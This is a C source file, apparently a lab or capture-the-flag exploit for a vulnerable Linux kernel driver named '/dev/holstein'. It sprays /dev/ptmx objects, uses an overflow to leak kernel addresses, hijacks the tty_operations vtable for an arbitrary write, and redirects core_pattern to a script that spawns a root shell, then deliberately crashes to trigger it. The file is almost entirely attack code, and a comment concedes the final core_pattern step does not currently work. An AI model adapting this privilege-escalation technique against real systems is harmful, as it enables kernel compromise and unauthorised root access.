#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define SPRAY_OBJECT "/dev/ptmx"
#define BUFFER_SIZE 0x400
#define SPRAY_WIDTH 100

#define mov_prdx_rsi (kbase + 0x0b8375)
#define core_pattern (kbase + 0xd6904c)
unsigned long kbase;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

int fd;
int ptmx[SPRAY_WIDTH];
char payload[BUFFER_SIZE+0x200];
unsigned long slot_buf;

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void exploit_core_pattern() {
    puts("[*] Setting up for fake core_pattern");

    system("echo '#!/bin/sh\n/bin/sh' > /tmp/pwn");
    system("chmod +x /tmp/pwn");

    puts("[*] triggering core");
    char* p = 0x0;
    *p = 0x1; // crash
}

void spray() {
    for(int i = 0; i < SPRAY_WIDTH/2; i++) {
        ptmx[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (ptmx[i] < 0) {
            error("[-] open spray");
        }
    }
    
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        error("[-] open device");
    }
    printf("[+] device opened at := %d\n", fd);

    for(int i = 50; i < SPRAY_WIDTH; i++) {
        ptmx[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if (ptmx[i] < 0) {
            error("[-] open spray");
        }
    }
}

void AAW32(unsigned long addr, unsigned int val) {
    // overwriting tty_operations vtable
    *(unsigned long *)&payload[0x418] = slot_buf;
    *(unsigned long *)&payload[12*sizeof(long)] = mov_prdx_rsi;

    // sending payload
    if (write(fd, &payload, 0x450) < 0) {
        error("[-] write");
    }

    // triggering payload
    for(int i = 0; i < SPRAY_WIDTH; i++){
        ioctl(ptmx[i], val /* esi ecx r12d */, addr /* rdx r8 r14 */);
    }
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);

    spray();

    if (read(fd, payload, 0x450) < 0) {
        error("[-] read");
    }

    slot_buf = *(unsigned long *)&payload[0x438] - 0x438;
    kbase = *(unsigned long *)&payload[0x418] - 0xc38880;
    printf("[+] g_buf := %#lx\n", slot_buf);
    printf("[+] kernel base := %#lx\n", kbase);

    char evil[] = "/tmp/pwn";
    for(int i = 0; i < sizeof(evil); i += 4) {
        AAW32(core_pattern + i, *(unsigned int *)&evil[i]);
    }

    // in theory but currently not working as
    // the area of core_pattern is read only. 
    exploit_core_pattern();

    return 0;
}
